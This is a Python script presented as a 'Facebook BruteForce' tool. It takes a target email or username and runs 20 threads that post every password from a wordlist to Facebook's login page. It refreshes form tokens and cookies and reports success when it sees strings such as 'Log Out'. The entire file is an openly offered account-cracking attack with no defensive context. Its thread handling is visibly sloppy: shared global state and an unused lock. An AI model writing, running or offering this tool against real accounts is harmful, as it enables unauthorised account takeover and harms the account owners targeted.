
import os.path
import requests
from bs4 import BeautifulSoup
import sys
from threading import Thread, Lock
import time

if sys.version_info[0] != 3:
    print('\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 fb.py\n\t--------------------------------------')
    sys.exit()

PASSWORD_FILE = "passwords.txt"
MIN_PASSWORD_LENGTH = 6
POST_URL = 'https://www.facebook.com/login.php'
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}
PAYLOAD = {}
COOKIES = {}

def create_form():
    form = dict()
    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

    data = requests.get(POST_URL, headers=HEADERS)
    for i in data.cookies:
        cookies[i.name] = i.value
    data = BeautifulSoup(data.text, 'html.parser').form
    if data.input['name'] == 'lsd':
        form['lsd'] = data.input['value']
    return form, cookies

def is_this_a_password(email, index, password):
    global PAYLOAD, COOKIES
    if index % 10 == 0:
        PAYLOAD, COOKIES = create_form()
        PAYLOAD['email'] = email
    PAYLOAD['pass'] = password
    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
        print('\npassword found is: ', password)
        return True
    return False

# Lock to ensure proper synchronization
lock = Lock()

# Function to handle password attempts for a chunk of passwords
def password_attempt_chunk(email, password_chunk):
    global PAYLOAD, COOKIES
    for index, password in enumerate(password_chunk):
        password = password.strip()
        if len(password) < MIN_PASSWORD_LENGTH:
            continue
        print("Trying password [", index, "]: ", password)
        if is_this_a_password(email, index, password):
            break

# Main function with multithreading implementation
def main():
    print('\n---------- Welcome To Facebook BruteForce ----------\n')
    if not os.path.isfile(PASSWORD_FILE):
        print("Password file is not exist: ", PASSWORD_FILE)
        sys.exit(0)
    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
    print("Password file selected: ", PASSWORD_FILE)
    email = input('Enter Email/Username to target: ').strip()

    # Divide the passwords into chunks for multithreading
    num_threads = 20 # Number of threads
    chunk_size = len(password_data) // num_threads
    threads = []
    for i in range(num_threads):
        start_index = i * chunk_size
        end_index = (i + 1) * chunk_size if i != num_threads - 1 else len(password_data)
        chunk = password_data[start_index:end_index]
        thread = Thread(target=password_attempt_chunk, args=(email, chunk))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
